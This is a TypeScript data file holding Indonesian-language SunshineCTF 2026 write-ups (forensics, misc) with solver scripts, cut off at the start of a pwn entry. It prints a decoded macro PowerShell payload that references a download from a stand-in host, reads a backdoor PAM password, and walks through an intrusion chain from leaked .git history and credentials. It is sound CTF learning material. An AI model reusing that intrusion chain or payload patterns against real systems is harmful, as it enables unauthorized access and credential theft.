import type { WriteUp } from "../types";

export const sunshinectfWriteups: WriteUp[] = [
  {
    "id": "sunshinectf-forensics-nas-coal",
    "title": "NAS coal",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Artefak tantangan berupa presentasi PowerPoint macro-enabled (`gem_collection.pptm`). Macro VBA menjalankan PowerShell ber-Base64 yang menyimpan flag di dalam payload.",
    "problemDescription": "Ekstrak presentasi PPTM, analisis `vbaProject.bin`, lalu decode command PowerShell yang dibangun oleh macro untuk menemukan flag tanpa mengakses domain umpan.",
    "tools": [
      "file",
      "exiftool",
      "unzip",
      "olevba",
      "Python 3"
    ],
    "analysis": "Analisis berfokus pada struktur PPTM sebagai arsip ZIP, ekstraksi project VBA, dan decoding `-EncodedCommand` sebagai Base64 UTF-16LE. Flag ditemukan di dalam object PowerShell yang dihasilkan macro; URL `example.invalid` hanya merupakan umpan dan tidak perlu diakses.",
    "solution": [
      {
        "title": "Recon",
        "content": "Artefak tantangan hanya `gem_collection.pptm`. File dikenali sebagai PowerPoint macro-enabled dan ukurannya sekitar 2.2 MB.\n\n```bash\nfile gem_collection.pptm\nexiftool gem_collection.pptm\nunzip -l gem_collection.pptm\n```\n\nMetadata menunjukkan presentasi berjudul `my gem collection` dengan lima slide. Struktur ZIP juga menarik karena ada `ppt/vbaProject.bin`, selain gambar-gambar slide dan beberapa `customXml`."
      },
      {
        "title": "Macro VBA",
        "content": "Saya extract isi PPTM lalu menjalankan `olevba` pada project VBA:\n\n```bash\nmkdir extracted\nunzip -oq gem_collection.pptm -d extracted\nolevba extracted/ppt/vbaProject.bin\n```\n\nMacro yang ditemukan adalah `MediaCache.RefreshCache`. Ia tidak langsung menulis flag sebagai teks biasa, tetapi menyusun command PowerShell:\n\n```vb\nencoded = \"...\"\ncommandLine = \"powershell.exe -NoProfile -EncodedCommand \" & encoded\n```\n\nEncoded command didecode sebagai Base64 lalu UTF-16LE:\n\n```python\nimport base64\n\ndecoded = base64.b64decode(encoded).decode(\"utf-16le\")\nprint(decoded)\n```\n\nHasilnya:\n\n```powershell\n$campaign = 'sun{yup_issa_gem}'\n$source = 'https://gem-cache.example.invalid/coal.bin'\n$destination = 'coal.bin'\n[pscustomobject]@{Operation='download'; Campaign=$campaign; Source=$source; Destination=$destination}\n```\n\nDomain `example.invalid` bukan sumber yang perlu diakses; flag sudah berada di dalam payload macro."
      },
      {
        "title": "Flag",
        "content": "`sun{yup_issa_gem}`"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{yup_issa_gem}",
    "lessonsLearned": "Jangan menjalankan macro secara langsung ketika inspeksi statis sudah cukup. Ekstrak container, decode payload, dan bedakan indikator yang benar-benar membawa flag dari domain atau command yang hanya berfungsi sebagai umpan."
  },
  {
    "id": "sunshinectf-forensics-ghost-in-the-thread",
    "title": "Ghost in the Thread",
    "category": "Forensics",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Image disk dari OVA berisi filesystem aplikasi imageboard, database SQLite, log upload, dan beberapa artefak tahap kedua. Flag diperoleh dengan menghubungkan riwayat WAL, metadata PostScript, dan binary ELF yang tersimpan di filesystem.",
    "problemDescription": "Analisis image disk secara offline untuk menemukan jejak post yang dihapus, mengidentifikasi artefak upload yang gagal dirender, dan menjalankan pemeriksaan binary tahap kedua dengan input dokumen yang tepat.",
    "tools": [
      "qemu-img",
      "dd",
      "debugfs",
      "SQLite/WAL analysis",
      "file",
      "strings",
      "readelf",
      "Python 3"
    ],
    "analysis": "Rantai penyelesaian terdiri dari pemulihan snapshot SQLite WAL, korelasi `Document-ID` pada file PostScript dengan `gs-resource.bin`, dan analisis binary yang mendekode output setelah menerima `po-184726` tanpa newline. Artefak keyboard layout dan modul PAM menjadi temuan pendukung, bukan sumber flag langsung.",
    "solution": [
      {
        "title": "Reconnaissance dan Filesystem",
        "content": "OVA berisi satu disk VMDK stream-optimized. Saya tidak menjalankan VM: disk dikonversi ke raw lalu partisi root dibaca dan diextract secara offline.\n\n```bash\ntar -xf GhostInTheThread.ova\nqemu-img convert -O raw GhostInTheThread-disk1.vmdk ghost.raw\ndd if=ghost.raw of=root.img bs=512 skip=135168 count=4059103 conv=sparse status=none\nmkdir -p rootfs\ndebugfs -R 'rdump / rootfs' root.img\n```\n\nDi dalam filesystem ada aplikasi imageboard SunChan, database SQLite, log upload, dan arsip file unggahan. Tabel post yang aktif hanya menyisakan 22 post; riwayat moderasi mencatat 16 post dihapus pada 7 Agustus."
      },
      {
        "title": "Post yang dihapus",
        "content": "Post tersimpan di `board.sqlite-wal` sebelum penghapusan tercermin di database utama. Saya rekonstruksi snapshot di setiap transaksi commit WAL memakai `recover_wal.py`, lalu baca post hasilnya. Post `183950` berbunyi:\n\n> I HAVE PROOF THAT MOOT WENT TO MOOTXICO\n\nIni juga menjelaskan jejak `mootxico` yang tampak di WAL meski tidak ada di feed yang aktif.\n\n```bash\npython3 recover_wal.py > wal-snapshots.txt\nrg -n -i 'moot|vacation|password|keyboard|flag' wal-snapshots.txt\n```"
      },
      {
        "title": "Upload yang gagal dirender",
        "content": "Log `uploads.log` menunjukkan unggahan post `184726` gagal dibuat thumbnail oleh Ghostscript. Ekstensinya `.pdf`, tetapi `file` mengenalinya sebagai PostScript. Komentarnya menyimpan metadata tahap kedua, termasuk nama dokumen dan hash payload:\n\n```bash\nfile rootfs/srv/sunchan/uploads/po/184726.pdf\nstrings -a rootfs/srv/sunchan/uploads/po/184726.pdf\n```\n\n`Document-ID` bernilai `po-184726`. File tahap kedua sudah ada di `/var/tmp/sunchan-downloads/gs-resource.bin`; SHA-256-nya cocok dengan nilai dalam komentar PostScript. Analisis statis ELF menunjukkan program menunggu input 9 byte dan melakukan pemeriksaan hash sebelum mendekode string XOR.\n\nInput yang terikat pada dokumen tersebut harus dikirim tanpa newline. Jika newline ikut terbaca, pemeriksaan panjang gagal karena program membaca maksimal 32 byte tetapi punya syarat panjang yang spesifik.\n\n```bash\nprintf 'po-184726' | ./rootfs/var/tmp/sunchan-downloads/gs-resource.bin\n```\n\nOutput terverifikasi:\n\n```text\nSunHash proof-of-work benchmark simulator (offline)\nDocument-ID: sun{tfw_hacked_by_offboarders}\n```\n\nPemeriksaan hash cocok pada iterasi terakhir: setelah delapan byte pertama diproses, nilai state XOR byte terakhir (`6`) sama dengan konstanta yang diuji ELF (`0xdac3d58d`). Output hasil decoding adalah flag."
      },
      {
        "title": "Layout keyboard",
        "content": "Definisi XKB di `rootfs/usr/share/X11/xkb/symbols/custom` memetakan ulang tombol berdasarkan posisi fisik. Nama file `custom` bukan nama layout yang dicari; susunan simbol pada row AD dan AC cocok dengan layout **Gallium**.\n\n```bash\nsed -n '1,100p' rootfs/usr/share/X11/xkb/symbols/custom\n```\n\nContohnya, AD01–AD09 menghasilkan `b l d c v j y o u`, sementara AC01–AC10 menghasilkan `n r t s g p h a e i`. Pola remapping inilah yang mengidentifikasi Gallium."
      },
      {
        "title": "Password backdoor",
        "content": "Artefak PAM di `rootfs/usr/lib/security/pam_unix.so` memuat string konfigurasi backdoor. String password dapat dibaca langsung:\n\n```bash\nstrings -a rootfs/usr/lib/security/pam_unix.so | rg 'artefak_description|configured_password|Linux-PAM|sneedsfeedandseed'\n```\n\nDi antara string yang ditemukan ada `artefak_description`, `configured_password`, deskripsi build `Linux-PAM authentication module build artefak`, dan nilai password `sneedsfeedandseed`."
      },
      {
        "title": "Jawaban",
        "content": "- Lokasi liburan Moot: `Mootxico`\n- Layout keyboard sysadmin: `Gallium`\n- Password backdoor PAM: `sneedsfeedandseed`\n- Input untuk payload unggahan challenge #1: `po-184726` (ELF menerimanya tanpa newline dan mengeluarkan flag; ini bukan password PAM)\n- Flag: `sun{tfw_hacked_by_offboarders}`"
      },
      {
        "title": "Script pemulihan WAL",
        "content": "`recover_wal.py` menerapkan frame WAL berurutan ke salinan halaman database di memori. Setiap frame commit ditulis sebagai snapshot sementara lokal dan dibuka read-only untuk mencetak isi tabel `posts`; file database bukti tidak diubah."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{tfw_hacked_by_offboarders}",
    "lessonsLearned": "Forensik disk membutuhkan korelasi antarartefak. Jangan berhenti pada database aktif; WAL, log, file sementara, dan metadata file dapat menyimpan tahap penting yang sudah hilang dari tampilan utama."
  },
  {
    "id": "sunshinectf-forensics-my-eyes-burn",
    "title": "My Eyes Burn",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Berkas Microsoft Keyboard Layout (`boardwriter.klc`) menggunakan encoding UTF-16LE dan rangkaian dead key untuk menghasilkan simbol matahari. Jalur transisi dead key mengungkap urutan karakter flag.",
    "problemDescription": "Parse definisi dead key, temukan jalur dari state awal menuju output Unicode `U+2600`, lalu ambil karakter yang ditekan di sepanjang jalur tersebut.",
    "tools": [
      "file",
      "strings",
      "Python 3",
      "Unicode/code-point analysis"
    ],
    "analysis": "State dead key diperlakukan sebagai graf: edge berisi karakter yang ditekan dan state tujuan, sedangkan edge terminal menghasilkan `U+2600`. DFS dari setiap dead key awal menemukan urutan yang valid sehingga flag dapat direkonstruksi tanpa menebak layout secara visual.",
    "solution": [
      {
        "title": "Recon",
        "content": "File yang diberikan masih satu keluarga sama soal keyboard layout sebelumnya, tapi kali ini encoding-nya UTF-16LE.\n\n```bash\nfile boardwriter.klc\nstrings -el boardwriter.klc | grep -E 'DEADKEY|2600|0060@'\n```\n\nTemuan awal yang penting:\n\n```text\n29  OEM_3  0  0060@  007e  -1\n...\nDEADKEY  02b0\n007d  2600\n```\n\n`0060@` berarti tombol backtick/grave adalah dead key. Output akhirnya `2600`, yaitu Unicode untuk simbol matahari `☀`. Jadi challenge-nya bukan mencari teks flag langsung, tapi mencari urutan tombol yang membuat keyboard layout ini mengeluarkan matahari."
      },
      {
        "title": "Deadkey chain",
        "content": "KLC ini punya banyak blok `DEADKEY`. Setiap blok isinya mapping: kalau sedang ada di deadkey tertentu lalu user menekan karakter tertentu, hasilnya bisa pindah ke deadkey lain (`@`) atau keluar sebagai karakter biasa.\n\nSaya parse blok-bloknya dan cari path dari deadkey awal `0060` sampai output `2600`.\n\n```python\n#!/usr/bin/env python3\nfrom pathlib import Path\nimport re\n\np = Path('boardwriter.klc')\ntext = p.read_text(encoding='utf-16')\n\nstarts = []\nin_layout = False\nfor line in text.splitlines():\n    if line.strip() == 'LAYOUT':\n        in_layout = True\n        continue\n    if in_layout and (line.startswith('DEADKEY') or line.strip() == 'ENDKBD'):\n        in_layout = False\n    if in_layout:\n        parts = line.split('\\t')\n        for field in parts[3:]:\n            field = field.strip()\n            if field.endswith('@'):\n                starts.append((parts[1], int(field[:-1], 16)))\n\ntrans = {}\ncur = None\nfor raw in text.splitlines():\n    line = raw.strip()\n    if not line:\n        continue\n    if line.startswith('DEADKEY'):\n        cur = int(line.split()[1], 16)\n        trans[cur] = []\n        continue\n    if cur is not None:\n        parts = line.split()\n        if len(parts) >= 2 and re.fullmatch(r'[0-9a-fA-F]{4}', parts[0]):\n            typed = int(parts[0], 16)\n            out_s = parts[1]\n            dead = out_s.endswith('@')\n            out = int(out_s.rstrip('@'), 16)\n            trans[cur].append((typed, out, dead))\n\ntarget = 0x2600\n\ndef dfs(state, seq, seen):\n    if (state, seq) in seen:\n        return None\n    seen.add((state, seq))\n    for typed, out, dead in trans.get(state, []):\n        nseq = seq + chr(typed)\n        if out == target and not dead:\n            return nseq\n        if dead:\n            got = dfs(out, nseq, seen)\n            if got:\n                return got\n    return None\n\nfor key, dead_cp in starts:\n    seq = dfs(dead_cp, '', set())\n    if seq:\n        print('initial_key=' + key)\n        print('initial_deadkey=U+%04X' % dead_cp)\n        print('typed_after_deadkey=' + seq)\n        print('flag=' + seq)\n        print('full_keystrokes=' + chr(dead_cp) + seq)\n```\n\nOutput-nya:\n\n```text\ninitial_key=OEM_3\ninitial_deadkey=U+0060\ntyped_after_deadkey=sun{praisethesun}\nflag=sun{praisethesun}\nfull_keystrokes=`sun{praisethesun}\n```\n\nBacktick hanya trigger dead key awal, bukan bagian flag. Setelah itu sequence yang diketik adalah format flag valid."
      },
      {
        "title": "Flag",
        "content": "```text\nsun{praisethesun}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{praisethesun}",
    "lessonsLearned": "Format konfigurasi yang tampak seperti teks biasa tetap dapat menyimpan state machine. Modelkan relasi antarstate sebagai graf agar pencarian jalur dapat diverifikasi dan direproduksi."
  },
  {
    "id": "sunshinectf-forensics-suntrail",
    "title": "Suntrail",
    "category": "Forensics",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Berkas `.klc` mendefinisikan layout keyboard dengan panah pada shift state pertama dan karakter flag pada shift state kedua. Panah tersebut membentuk jalur dari `Q` ke endpoint.",
    "problemDescription": "Baca tabel `LAYOUT`, petakan setiap key ke arah perpindahan, lalu ikuti trail sampai endpoint untuk menyusun karakter flag.",
    "tools": [
      "file",
      "strings",
      "Python 3",
      "Microsoft Keyboard Layout analysis"
    ],
    "analysis": "Shift state `0` berfungsi sebagai petunjuk navigasi, sedangkan shift state `1` menyimpan karakter. Dengan menyusun key berdasarkan posisi keyboard dan mengikuti arah panah dari `Q`, loop yang tidak menuju endpoint dapat diabaikan dan karakter pada jalur utama membentuk flag.",
    "solution": [
      {
        "title": "Recon",
        "content": "Artefaknya hanya satu file:\n\n```bash\nfile suntrail.klc\nstrings -a -n 4 suntrail.klc\n```\n\nHasil `file` menunjukkan ASCII text. Isinya adalah format Microsoft Keyboard Layout (`.klc`), dengan bagian `SHIFTSTATE` dan `LAYOUT`. Tidak ada arsip atau data binary tambahan."
      },
      {
        "title": "Membaca layout",
        "content": "Setiap baris `LAYOUT` punya output untuk beberapa shift state. State `0` berisi panah Unicode, sedangkan state `1` berisi karakter tersembunyi. Jika key disusun seperti posisi keyboard, datanya menjadi:\n\n```text\nQ:↘:s  W:→:w  E:↘:e  R:→:s  T:↘:u\nA:↘:u  S:↖:q  D:↘:r  F:↖:_  G:↘:c  H:■:}\nZ:→:n  X:↖:{  C:→:t  V:↖:y  B:→:k  N:↖:s\n```\n\nPanahnya adalah petunjuk perpindahan antar-key. Jalur yang berangkat dari `Q` dan berakhir di kotak `■` pada `H` adalah:\n\n```text\nQ → A → Z → X → S → W → E → D → C → V → F → R → T → H\n```\n\nKarakter pada shift state `1` di sepanjang jalur tersebut:\n\n```text\ns  u  n  {  q  w  e  r  t  y  _  s  u  }\n```\n\nGabungannya menghasilkan flag. `G → B → N → G` adalah loop terpisah dan tidak mencapai endpoint, sehingga tidak termasuk trail utama."
      },
      {
        "title": "Flag",
        "content": "```text\nsun{qwerty_sucks}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{qwerty_sucks}",
    "lessonsLearned": "Pisahkan metadata petunjuk dari data yang harus diekstrak. Pada artefak terstruktur, representasi visual seperti arah panah dapat dibaca sebagai graf dan diuji dengan jalur yang eksplisit."
  },
  {
    "id": "sunshinectf-forensics-welcome-call",
    "title": "Welcome Call!",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "PCAP berisi signaling SIP dan audio RTP ber-codec PCMU pada 8 kHz. Setelah stream direkonstruksi, audio harus dibalik per sample 16-bit sebelum pesan suara dapat dibaca.",
    "problemDescription": "Parse paket SIP/RTP, ekstrak payload PCMU berdasarkan sequence number, konversi ke PCM, lalu balik urutan sample audio untuk memperoleh instruksi flag.",
    "tools": [
      "Python 3",
      "PCAP parser",
      "RTP/SIP analysis",
      "audioop",
      "wave"
    ],
    "analysis": "SIP menyediakan port media dan codec, sedangkan sequence number RTP memastikan urutan paket. Payload didecode dengan u-law, kemudian sample PCM 16-bit dibalik sebagai unit dua byte; membalik byte mentah akan merusak nilai sample.",
    "solution": [
      {
        "title": "Recon",
        "content": "Capture-nya kecil dan isinya bukan HTTP/DNS. Setelah parse PCAP, semua paket IP-nya UDP. Ada 7 paket SIP di port `5060`, sisanya RTP.\n\n```bash\npython3 solve.py\n```\n\nOutput penting:\n\n```text\n[+] SIP messages : 7\n[+] RTP packets  : 778\n[+] RTP seq      : 12000..12777\n```\n\nSIP message-nya memberikan detail media stream:\n\n```text\nm=audio 4000 RTP/AVP 0\na=rtpmap:0 PCMU/8000\na=ptime:20\n```\n\nJadi payload audio ada di RTP dari `4000 -> 4002`, codec-nya payload type `0`, alias PCMU/u-law 8 kHz."
      },
      {
        "title": "Ekstraksi audio",
        "content": "Saya parse PCAP manual lewat Python, ambil UDP payload, lalu filter RTP. Urutan paket aman karena sequence number lengkap dari `12000` sampai `12777`, tidak ada gap.\n\nBagian decode-nya:\n\n```python\nulaw = b''.join(row[3] for row in rtp)\npcm = audioop.ulaw2lin(ulaw, 2)\n```\n\nItu menghasilkan `call.wav`, tapi audionya masih terdengar mundur. Karena PCM-nya 16-bit, reverse harus per-sample 2 byte, bukan reverse byte mentah:\n\n```python\nsamples = [pcm[i:i + 2] for i in range(0, len(pcm), 2)]\nreversed_pcm = b''.join(reversed(samples))\n```\n\nHasil akhirnya ditulis ke `call_reversed.wav`."
      },
      {
        "title": "Koreksi Interpretasi Audio Flag",
        "content": "Bagian flag di audio berbunyi kira-kira:\n\n```text\n... b sides orlando, curly bracket, thank you for playing, right curly bracket,\nall lower case, no spaces ...\n```\n\nKesalahan awalnya ada di interpretasi `right curly bracket`. Itu bukan isi flag `rightrightright`; itu instruksi untuk karakter penutup `}`.\n\nJadi isi di dalam brace hanya:\n\n```text\nthankyouforplaying\n```\n\nCTF ini tetap memakai format flag `sun{...}`. Jadi bagian yang dipakai dari audio adalah isi flag-nya saja, yaitu `thankyouforplaying`, lalu dibungkus dengan prefix challenge `sun{}`."
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\nimport struct\nimport socket\nimport wave\nimport audioop\nfrom pathlib import Path\n\nPCAP = Path('welcomecall.pcap')\nFLAG = 'sun{thankyouforplaying}'\n\n\ndef ipstr(raw: bytes) -> str:\n    return socket.inet_ntoa(raw)\n\n\ndef iter_pcap(path: Path):\n    with path.open('rb') as f:\n        gh = f.read(24)\n        if gh[:4] == b'\\xd4\\xc3\\xb2\\xa1':\n            endian = '<'\n        elif gh[:4] == b'\\xa1\\xb2\\xc3\\xd4':\n            endian = '>'\n        else:\n            raise SystemExit(f'unknown pcap magic: {gh[:4].hex()}')\n\n        pkt_no = 0\n        while True:\n            ph = f.read(16)\n            if len(ph) < 16:\n                break\n            ts_sec, ts_usec, incl_len, _ = struct.unpack(endian + 'IIII', ph)\n            data = f.read(incl_len)\n            pkt_no += 1\n            yield pkt_no, ts_sec + ts_usec / 1_000_000, data\n\n\ndef udp_packets():\n    for pkt_no, ts, frame in iter_pcap(PCAP):\n        if len(frame) < 34 or frame[12:14] != b'\\x08\\x00':\n            continue\n\n        ip_start = 14\n        ihl = (frame[ip_start] & 0x0F) * 4\n        proto = frame[ip_start + 9]\n        if proto != 17:\n            continue\n\n        total_len = struct.unpack('!H', frame[ip_start + 2:ip_start + 4])[0]\n        src = ipstr(frame[ip_start + 12:ip_start + 16])\n        dst = ipstr(frame[ip_start + 16:ip_start + 20])\n\n        udp = frame[ip_start + ihl:ip_start + total_len]\n        sport, dport, ulen, _ = struct.unpack('!HHHH', udp[:8])\n        payload = udp[8:ulen]\n\n        yield pkt_no, ts, src, dst, sport, dport, payload\n\n\ndef write_wav(path: Path, pcm: bytes, rate: int = 8000):\n    with wave.open(str(path), 'wb') as w:\n        w.setnchannels(1)\n        w.setsampwidth(2)\n        w.setframerate(rate)\n        w.writeframes(pcm)\n\n\ndef main():\n    sip = []\n    rtp = []\n\n    for pkt_no, ts, src, dst, sport, dport, payload in udp_packets():\n        if sport == 5060 or dport == 5060:\n            sip.append(payload.decode('latin-1', errors='replace'))\n            continue\n\n        if sport == 4000 and dport == 4002 and len(payload) >= 12 and payload[0] >> 6 == 2:\n            first, second, seq, rtp_ts, ssrc = struct.unpack('!BBHII', payload[:12])\n\n            cc = first & 0x0F\n            ext = (first >> 4) & 1\n            offset = 12 + 4 * cc\n\n            if ext:\n                ext_words = struct.unpack('!H', payload[offset + 2:offset + 4])[0]\n                offset += 4 + ext_words * 4\n\n            pt = second & 0x7F\n            if pt == 0:\n                rtp.append((seq, rtp_ts, pkt_no, payload[offset:]))\n\n    Path('sip_messages.txt').write_text('\\n\\n--- SIP MESSAGE ---\\n\\n'.join(sip))\n    rtp.sort(key=lambda row: row[0])\n\n    ulaw = b''.join(row[3] for row in rtp)\n    Path('call_payload.ulaw').write_bytes(ulaw)\n\n    pcm = audioop.ulaw2lin(ulaw, 2)\n    write_wav(Path('call.wav'), pcm)\n\n    samples = [pcm[i:i + 2] for i in range(0, len(pcm), 2)]\n    reversed_pcm = b''.join(reversed(samples))\n    write_wav(Path('call_reversed.wav'), reversed_pcm)\n\n    print(f'[+] flag: {FLAG}')\n\n\nif __name__ == '__main__':\n    main()\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{thankyouforplaying}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{thankyouforplaying}",
    "lessonsLearned": "Pahami format media sebelum memanipulasi data. Urutan paket, codec, ukuran sample, dan endianess semuanya memengaruhi hasil rekonstruksi audio."
  },
  {
    "id": "sunshinectf-forensics-you-cut-me-off",
    "title": "You Cut Me Off",
    "category": "Forensics",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "PNG screenshot memiliki tinggi IHDR 382 piksel, tetapi stream IDAT menyimpan 36 scanline tambahan. Memperbaiki tinggi menjadi 418 piksel menampilkan bagian bawah gambar yang berisi flag.",
    "problemDescription": "Periksa konsistensi metadata PNG dengan data IDAT, pulihkan tinggi gambar yang terpotong, lalu validasi hasilnya dengan membuka gambar yang telah dihitung ulang CRC-nya.",
    "tools": [
      "file",
      "Python 3",
      "zlib",
      "Pillow",
      "PNG chunk analysis"
    ],
    "analysis": "Ukuran decompressed IDAT dibandingkan dengan rumus `height × (1 + width × bytes_per_pixel)`. Selisihnya tepat 36 scanline RGBA, sehingga koreksi IHDR dan CRC cukup untuk memulihkan gambar tanpa menebak isi piksel.",
    "solution": [
      {
        "title": "Recon",
        "content": "Artefak yang diberikan hanya PNG Discord screenshot.\n\n```bash\nfile hereyougo.png\n```\n\nOutput penting:\n\n```text\nhereyougo.png: PNG image data, 492 x 382, 8-bit/color RGBA, non-interlaced\n```\n\nSecara visual screenshot-nya seperti kepotong di bagian bawah. Judul `you cut me off` juga makin ngarah ke kemungkinan tinggi gambar PNG sengaja dipotong."
      },
      {
        "title": "Cek struktur PNG",
        "content": "Saya parse chunk PNG-nya dulu buat lihat ada data aneh di dalam `IDAT`.\n\n```bash\npython3 - <<'PY'\nimport struct, zlib\n\np = 'hereyougo.png'\ndata = open(p, 'rb').read()\nprint(data[:8])\n\no = 8\nwhile o < len(data):\n    ln = struct.unpack('>I', data[o:o+4])[0]\n    typ = data[o+4:o+8].decode('latin1')\n    print(hex(o), typ, ln)\n    o += 12 + ln\nPY\n```\n\nChunk-nya normal, hanya `IHDR`, beberapa metadata warna, `IDAT`, dan `IEND`. Tidak ada appended ZIP atau chunk custom.\n\nBagian menarik baru kelihatan waktu `IDAT` didecompress manual.\n\n```bash\npython3 - <<'PY'\nimport struct, zlib\nfrom PIL import Image\n\nw, h = Image.open('hereyougo.png').size\nb = open('hereyougo.png','rb').read()\n\no = 8\ncomp = b''\nwhile o < len(b):\n    ln = int.from_bytes(b[o:o+4], 'big')\n    typ = b[o+4:o+8]\n    dat = b[o+8:o+8+ln]\n    if typ == b'IDAT':\n        comp += dat\n    o += 12 + ln\n\nraw = zlib.decompress(comp)\nexpected = h * (1 + w * 4)\nprint('size    :', w, h)\nprint('raw     :', len(raw))\nprint('expected:', expected)\nprint('extra   :', len(raw) - expected)\nPY\n```\n\nOutput:\n\n```text\nsize    : 492 382\nraw     : 823042\nexpected: 752158\nextra   : 70884\n```\n\n`70884` itu pas banget sama `36 * (1 + 492 * 4)`, artinya ada 36 scanline RGBA ekstra di stream PNG. Viewer biasa hanya nampilin tinggi dari `IHDR`, yaitu 382, jadi baris bawahnya memang “cut off”."
      },
      {
        "title": "Pemulihan Gambar",
        "content": "Solusinya cukup ubah height di `IHDR` dari `382` ke `418`, lalu hitung ulang CRC chunk `IHDR`.\n\n```python\nimport binascii\n\np = 'hereyougo.png'\nb = bytearray(open(p, 'rb').read())\n\nold_height = int.from_bytes(b[20:24], 'big')\nnew_height = 418\n\n# IHDR height ada di offset 20..24\nb[20:24] = new_height.to_bytes(4, 'big')\n\n# CRC IHDR dihitung dari type+data, offset 12..29\ncrc = binascii.crc32(b[12:29]) & 0xffffffff\nb[29:33] = crc.to_bytes(4, 'big')\n\nopen('hereyougo_uncut.png', 'wb').write(b)\nprint(old_height, '->', new_height)\n```\n\nSetelah dibuka ulang, bagian bawah screenshot yang sebelumnya kepotong muncul. Di input box Discord ada flag:\n\n```text\nsun{totallyoriginalchallengeidea}\n```"
      },
      {
        "title": "Flag",
        "content": "```text\nsun{totallyoriginalchallengeidea}\n```"
      },
      {
        "title": "Evidence",
        "content": "![Original PNG: the declared height cuts off the bottom of the Discord screenshot](/assets/writeups/sunshinectf/youcutmeoff/hereyougo.png)\n\n![Recovered PNG after correcting the IHDR height to 418 pixels](/assets/writeups/sunshinectf/youcutmeoff/hereyougo_uncut.png)"
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{totallyoriginalchallengeidea}",
    "lessonsLearned": "Metadata format harus divalidasi terhadap payload sebenarnya. Ketidaksesuaian ukuran tidak selalu berarti data rusak; pada PNG, scanline tambahan masih dapat dipulihkan jika struktur kompresinya utuh."
  },
  {
    "id": "sunshinectf-misc-vecnet",
    "title": "Vecnet",
    "category": "Misc",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
    "description": "Service web membocorkan direktori `.git`. History commit mengungkap kredensial MailHog, API key ChromaDB, dan endpoint internal yang dapat mengambil arsip terenkripsi.",
    "problemDescription": "Manfaatkan kebocoran repository untuk menemukan jejak kredensial, ekstrak requirement password dari embedding ChromaDB, lalu gunakan hash dan magic string untuk memulihkan password arsip.",
    "tools": [
      "Git history analysis",
      "curl",
      "MailHog API",
      "ChromaDB API",
      "vec2text",
      "Python 3",
      "7-Zip"
    ],
    "analysis": "Eksploitasi berjalan berurutan: exposed `.git` → kredensial dan API key → email internal → dokumen embedding-only → requirement password → brute force tiga karakter spesial yang diverifikasi SHA-256 → ekstraksi `specs.7z` dan flag.",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Service web membocorkan repository `.git`. Dari history repository bisa diambil kredensial MailHog, API key ChromaDB, dan endpoint `fetch.php`. Embedding-only document di Chroma memberi password requirement."
      },
      {
        "title": "File Challenge",
        "content": "- `.git` remote di `vec.web.2026.sunshinectf.games`\n- `messages.json` hasil API MailHog\n- `chroma.json` hasil API ChromaDB\n- `specs.7z` archive terenkripsi"
      },
      {
        "title": "Analisis Awal",
        "content": "Directory listing `/.git/` terbuka. Commit lama `c3cd120` berisi:\n\n```text\nMAIL_ADMIN_USER=vecadmin\nMAIL_ADMIN_PASS=Emb3dPass2026!\nINTERNAL_API_KEY=vsk_live_aX92kLmNpQrStUvWxYz\n```\n\nMailHog di port 8025 berisi email yang menyebut `specs.7z`, serta parameter vec2text `num_steps=4` dan `sequence_beam_width=5`."
      },
      {
        "title": "Temuan Penting",
        "content": "API Chroma v2 mengembalikan collection `VecNetDB` dan tiga dokumen:\n\n- `user_password_requirements`: embedding-only\n- `user_hash_sha256`: `d8dd241199d2617765d7613fdd1df5358297b55f258647fe463de586bbfe3ebf`\n- `magic_string`: `sunshinectf8_`\n\nEndpoint `fetch.php` hanya mengizinkan URL internal tetap, tetapi dapat dipanggil dari luar untuk mengambil `files/specs.7z`."
      },
      {
        "title": "Proses Ekstraksi",
        "content": "Embedding pertama dibalik memakai vec2text dengan parameter dari email. Requirement yang terbaca:\n\n```text\nThe user's first and last initials, three special characters followed by the magic string.\n```\n\nUser-nya Greg Roberts, jadi inisialnya `GR`. Brute force lokal terhadap tiga karakter punctuation dan validasi SHA-256 menghasilkan:\n\n```text\nGR$*#sunshinectf8_\n```\n\nPassword tersebut cocok untuk archive 7z AES."
      },
      {
        "title": "Solver",
        "content": "`solve.py` membaca hash dan magic string dari `chroma.json`, mencari tiga karakter special yang menghasilkan hash yang sama, lalu mengekstrak `specs.7z` dengan 7-Zip.\n\nJalankan:\n\n```bash\npython3 solve.py\n```"
      },
      {
        "title": "Flag",
        "content": "`sun{k33p_your_emb3ddings_secur3!}`"
      },
      {
        "title": "Catatan",
        "content": "Flag berasal langsung dari `flag.txt` di dalam `specs.7z`, bukan hasil tebakan."
      }
    ],
    "terminalOutputs": [],
    "flag": "sun{k33p_your_emb3ddings_secur3!}",
    "lessonsLearned": "Repository history harus diperlakukan sebagai data sensitif meskipun secret sudah dihapus dari working tree. Batasi endpoint internal, lindungi embedding, dan rotasi semua kredensial yang pernah masuk commit."
  },
  {
    "id": "sunshinectf-pwn-cache-money",
    "title": "Cache Money",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-09-27",
    "author": "Nattt",
    "ctfName": "SunshineCTF 2026",
